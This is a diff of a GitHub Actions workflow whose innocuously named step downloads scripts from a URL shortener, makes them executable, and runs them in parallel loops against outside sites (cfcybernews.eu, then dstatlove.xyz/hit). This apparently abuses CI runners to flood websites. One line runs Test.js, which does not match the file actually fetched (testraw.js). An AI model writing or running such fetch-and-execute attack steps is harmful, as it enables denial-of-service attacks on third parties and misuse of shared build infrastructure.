@@ -15,13 +15,14 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://curl.by/VgaZT/value.js
-          wget https://curl.by/19kka/fres.txt
-          wget https://curl.by/BS8DR/ua.txt
-          chmod +x value.js
+          pip install git+https://github.com/QuantumLLC/Archer
+          wget https://curl.by/bmh8Y/Test.py
+          wget https://curl.by/D7o2s/testraw.js
+          chmod +x Test.py
+          chmod +x testraw.js
           PIDS=()
           for i in {1..4}; do
-            timeout 105 node value.js https://cfcybernews.eu 100 64 10 fres.txt
+            timeout 105 python3 Test.py https://dstatlove.xyz/hit && node Test.js https://dstatlove.xyz/hit 666
             PIDS+=($!)
           done
           
